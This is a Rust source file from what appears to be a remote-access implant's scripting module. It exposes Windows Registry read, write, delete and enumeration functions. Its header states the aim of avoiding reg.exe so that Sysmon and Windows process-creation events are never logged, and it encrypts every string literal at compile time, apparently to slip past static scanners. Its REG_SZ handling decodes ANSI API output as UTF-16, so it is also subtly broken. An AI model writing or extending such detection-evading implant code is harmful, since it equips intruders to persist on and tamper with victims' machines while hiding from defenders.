// src/agent/scripting/registry.rs
//
// Direct Windows Registry access via RegOpenKeyExA / RegQueryValueExA etc.
// Avoids spawning reg.exe which generates Sysmon Event ID 1 / Event 4688.
// All functions are no-ops that return descriptive errors on non-Windows.

use rhai::Engine;
use crate::strcrypt_rt;
use strcrypt::aes_str;

pub fn register(engine: &mut Engine) {

    // Read a registry value. hive: "HKCU"|"HKLM"|"HKCR"|"HKU"
    // Returns the value as a string; DWORD/QWORD values are formatted as decimal.
    engine.register_fn(&aes_str!("internal_reg_read"), |hive: &str, key: &str, value_name: &str| -> String {
        #[cfg(target_os = "windows")]
        {
            use std::ffi::CString;
            use super::win_ffi::reg_ext::*;
            let hroot = match resolve_hive(hive) { Some(h) => h, None => return format!("{}{}", aes_str!("Error: unknown hive "), hive) };
            let ckey  = match CString::new(key)        { Ok(s) => s, Err(_) => return aes_str!("Error: invalid key") };
            let cval  = match CString::new(value_name) { Ok(s) => s, Err(_) => return aes_str!("Error: invalid name") };
            unsafe {
                let mut hkey: HKEY = std::ptr::null_mut();
                if RegOpenKeyExA(hroot, ckey.as_ptr(), 0, KEY_READ, &mut hkey) != ERROR_SUCCESS {
                    return aes_str!("Error: key not found");
                }
                let mut data_type: DWORD = 0;
                let mut data_size: DWORD = 0;
                // Query size first.
                RegQueryValueExA(hkey, cval.as_ptr(), std::ptr::null_mut(), &mut data_type, std::ptr::null_mut(), &mut data_size);
                let mut buf = vec![0u8; data_size as usize + 2];
                let ret = RegQueryValueExA(hkey, cval.as_ptr(), std::ptr::null_mut(), &mut data_type, buf.as_mut_ptr(), &mut data_size);
                RegCloseKey(hkey);
                if ret != ERROR_SUCCESS { return format!("{}{})", aes_str!("Error: query failed ("), ret); }
                format_reg_value(data_type, &buf[..data_size as usize])
            }
        }
        #[cfg(not(target_os = "windows"))]
        format!("{}{}/{}/{}", aes_str!("Error: Registry is Windows only ("), hive, key, value_name)
    });

    // Write a string (REG_SZ) registry value.
    engine.register_fn(&aes_str!("internal_reg_write"), |hive: &str, key: &str, value_name: &str, data: &str| -> String {
        #[cfg(target_os = "windows")]
        {
            use std::ffi::CString;
            use super::win_ffi::reg_ext::*;
            let hroot = match resolve_hive(hive) { Some(h) => h, None => return format!("{}{}", aes_str!("Error: unknown hive "), hive) };
            let ckey  = match CString::new(key)        { Ok(s) => s, Err(_) => return aes_str!("Error: invalid key") };
            let cval  = match CString::new(value_name) { Ok(s) => s, Err(_) => return aes_str!("Error: invalid name") };
            let mut bytes: Vec<u8> = data.as_bytes().to_vec(); bytes.push(0); // null-terminate
            unsafe {
                let mut hkey: HKEY = std::ptr::null_mut();
                let mut disp: DWORD = 0;
                if RegCreateKeyExA(hroot, ckey.as_ptr(), 0, std::ptr::null_mut(), REG_OPTION_NON_VOLATILE, KEY_WRITE, std::ptr::null_mut(), &mut hkey, &mut disp) != ERROR_SUCCESS {
                    return aes_str!("Error: could not open/create key");
                }
                let ret = RegSetValueExA(hkey, cval.as_ptr(), 0, REG_SZ, bytes.as_ptr(), bytes.len() as DWORD);
                RegCloseKey(hkey);
                if ret == ERROR_SUCCESS { aes_str!("OK") } else { format!("{}{}", aes_str!("Error: "), ret) }
            }
        }
        #[cfg(not(target_os = "windows"))]
        format!("{}", aes_str!("Error: Registry is Windows only"))
    });

    // Delete a registry value.
    engine.register_fn(&aes_str!("internal_reg_delete_value"), |hive: &str, key: &str, value_name: &str| -> String {
        #[cfg(target_os = "windows")]
        {
            use std::ffi::CString;
            use super::win_ffi::reg_ext::*;
            let hroot = match resolve_hive(hive) { Some(h) => h, None => return format!("{}{}", aes_str!("Error: unknown hive "), hive) };
            let ckey  = match CString::new(key)        { Ok(s) => s, Err(_) => return aes_str!("Error: invalid key") };
            let cval  = match CString::new(value_name) { Ok(s) => s, Err(_) => return aes_str!("Error: invalid name") };
            unsafe {
                let mut hkey: HKEY = std::ptr::null_mut();
                if RegOpenKeyExA(hroot, ckey.as_ptr(), 0, KEY_WRITE, &mut hkey) != ERROR_SUCCESS {
                    return aes_str!("Error: key not found");
                }
                let ret = RegDeleteValueA(hkey, cval.as_ptr());
                RegCloseKey(hkey);
                if ret == ERROR_SUCCESS { aes_str!("Deleted") } else { format!("{}{}", aes_str!("Error: "), ret) }
            }
        }
        #[cfg(not(target_os = "windows"))]
        aes_str!("Error: Registry is Windows only")
    });

    // Delete a registry key (and all its values).
    engine.register_fn(&aes_str!("internal_reg_delete_key"), |hive: &str, parent_key: &str, subkey: &str| -> String {
        #[cfg(target_os = "windows")]
        {
            use std::ffi::CString;
            use super::win_ffi::reg_ext::*;
            let hroot  = match resolve_hive(hive)    { Some(h) => h, None => return format!("{}{}", aes_str!("Error: unknown hive "), hive) };
            let cparent = match CString::new(parent_key) { Ok(s) => s, Err(_) => return aes_str!("Error: invalid key") };
            let csub   = match CString::new(subkey)  { Ok(s) => s, Err(_) => return aes_str!("Error: invalid subkey") };
            unsafe {
                let mut hkey: HKEY = std::ptr::null_mut();
                if RegOpenKeyExA(hroot, cparent.as_ptr(), 0, KEY_WRITE, &mut hkey) != ERROR_SUCCESS {
                    return aes_str!("Error: parent key not found");
                }
                let ret = RegDeleteKeyA(hkey, csub.as_ptr());
                RegCloseKey(hkey);
                if ret == ERROR_SUCCESS { aes_str!("Deleted") } else { format!("{}{}", aes_str!("Error: "), ret) }
            }
        }
        #[cfg(not(target_os = "windows"))]
        aes_str!("Error: Registry is Windows only")
    });

    // Enumerate subkeys of a registry key - returns JSON array of names.
    engine.register_fn(&aes_str!("internal_reg_enum_keys"), |hive: &str, key: &str| -> String {
        #[cfg(target_os = "windows")]
        {
            use std::ffi::CString;
            use super::win_ffi::reg_ext::*;
            let hroot = match resolve_hive(hive) { Some(h) => h, None => return format!("{}{}", aes_str!("Error: unknown hive "), hive) };
            let ckey  = match CString::new(key)  { Ok(s) => s, Err(_) => return aes_str!("Error: invalid key") };
            unsafe {
                let mut hkey: HKEY = std::ptr::null_mut();
                if RegOpenKeyExA(hroot, ckey.as_ptr(), 0, KEY_READ, &mut hkey) != ERROR_SUCCESS {
                    return aes_str!("Error: key not found");
                }
                let mut names = Vec::new();
                let mut idx = 0u32;
                loop {
                    let mut name_buf = vec![0i8; 256];
                    let mut name_len = 256u32;
                    let ret = RegEnumKeyExA(hkey, idx, name_buf.as_mut_ptr(), &mut name_len,
                        std::ptr::null_mut(), std::ptr::null_mut(), std::ptr::null_mut(), std::ptr::null_mut());
                    if ret == ERROR_NO_MORE_ITEMS { break; }
                    if ret != ERROR_SUCCESS { break; }
                    let name = String::from_utf8_lossy(
                        &name_buf[..name_len as usize].iter().map(|&b| b as u8).collect::<Vec<_>>()
                    ).to_string();
                    names.push(name);
                    idx += 1;
                }
                RegCloseKey(hkey);
                serde_json::to_string(&names).unwrap_or("[]".into())
            }
        }
        #[cfg(not(target_os = "windows"))]
        aes_str!("Error: Registry is Windows only")
    });

    // Enumerate values in a registry key - returns JSON array of {name, type, data}.
    engine.register_fn(&aes_str!("internal_reg_enum_values"), |hive: &str, key: &str| -> String {
        #[cfg(target_os = "windows")]
        {
            use std::ffi::CString;
            use super::win_ffi::reg_ext::*;
            let hroot = match resolve_hive(hive) { Some(h) => h, None => return format!("{}{}", aes_str!("Error: unknown hive "), hive) };
            let ckey  = match CString::new(key)  { Ok(s) => s, Err(_) => return aes_str!("Error: invalid key") };
            unsafe {
                let mut hkey: HKEY = std::ptr::null_mut();
                if RegOpenKeyExA(hroot, ckey.as_ptr(), 0, KEY_READ, &mut hkey) != ERROR_SUCCESS {
                    return aes_str!("Error: key not found");
                }
                let mut values = Vec::new();
                let mut idx = 0u32;
                loop {
                    let mut name_buf  = vec![0i8;  256];
                    let mut name_len  = 256u32;
                    let mut data_buf  = vec![0u8; 4096];
                    let mut data_size = 4096u32;
                    let mut data_type = 0u32;
                    let ret = RegEnumValueA(hkey, idx,
                        name_buf.as_mut_ptr(), &mut name_len,
                        std::ptr::null_mut(), &mut data_type,
                        data_buf.as_mut_ptr(), &mut data_size);
                    if ret == ERROR_NO_MORE_ITEMS { break; }
                    if ret != ERROR_SUCCESS { break; }
                    let name = String::from_utf8_lossy(
                        &name_buf[..name_len as usize].iter().map(|&b| b as u8).collect::<Vec<_>>()
                    ).to_string();
                    let data = format_reg_value(data_type, &data_buf[..data_size as usize]);
                    values.push(serde_json::json!({ aes_str!("name").as_str(): name, aes_str!("type").as_str(): reg_type_name(data_type), aes_str!("data").as_str(): data }));
                    idx += 1;
                }
                RegCloseKey(hkey);
                serde_json::to_string(&values).unwrap_or("[]".into())
            }
        }
        #[cfg(not(target_os = "windows"))]
        aes_str!("Error: Registry is Windows only")
    });
}

// ─────────────────────────────────────────────────────────────────────────────
// Helpers (Windows only)
// ─────────────────────────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
fn resolve_hive(hive: &str) -> Option<super::win_ffi::reg_ext::HKEY> {
    use super::win_ffi::reg_ext::*;
    let h = hive.to_uppercase();
    if h == aes_str!("HKCU") || h == aes_str!("HKEY_CURRENT_USER") {
        Some(HKEY_CURRENT_USER)
    } else if h == aes_str!("HKLM") || h == aes_str!("HKEY_LOCAL_MACHINE") {
        Some(HKEY_LOCAL_MACHINE)
    } else if h == aes_str!("HKCR") || h == aes_str!("HKEY_CLASSES_ROOT") {
        Some(HKEY_CLASSES_ROOT)
    } else if h == aes_str!("HKU") || h == aes_str!("HKEY_USERS") {
        Some(HKEY_USERS)
    } else {
        None
    }
}

#[cfg(target_os = "windows")]
fn format_reg_value(data_type: u32, data: &[u8]) -> String {
    use super::win_ffi::reg_ext::*;
    match data_type {
        REG_SZ | REG_EXPAND_SZ => {
            let nul = data.chunks_exact(2)
                .position(|w| w[0] == 0 && w[1] == 0)
                .map(|i| i * 2)
                .unwrap_or(data.len());
            let wide: Vec<u16> = data[..nul].chunks_exact(2)
                .map(|w| u16::from_le_bytes([w[0], w[1]]))
                .collect();
            String::from_utf16_lossy(&wide)
        }
        REG_DWORD => {
            if data.len() >= 4 { u32::from_le_bytes([data[0], data[1], data[2], data[3]]).to_string() }
            else { aes_str!("Error: short DWORD") }
        }
        REG_QWORD => {
            if data.len() >= 8 {
                u64::from_le_bytes(data[..8].try_into().unwrap_or([0u8; 8])).to_string()
            } else { aes_str!("Error: short QWORD") }
        }
        REG_BINARY => hex::encode(data),
        _ => hex::encode(data),
    }
}

#[cfg(target_os = "windows")]
fn reg_type_name(t: u32) -> String {
    use super::win_ffi::reg_ext::*;
    match t {
        REG_SZ        => aes_str!("REG_SZ"),
        REG_EXPAND_SZ => aes_str!("REG_EXPAND_SZ"),
        REG_BINARY    => aes_str!("REG_BINARY"),
        REG_DWORD     => aes_str!("REG_DWORD"),
        REG_QWORD     => aes_str!("REG_QWORD"),
        _             => aes_str!("REG_UNKNOWN"),
    }
}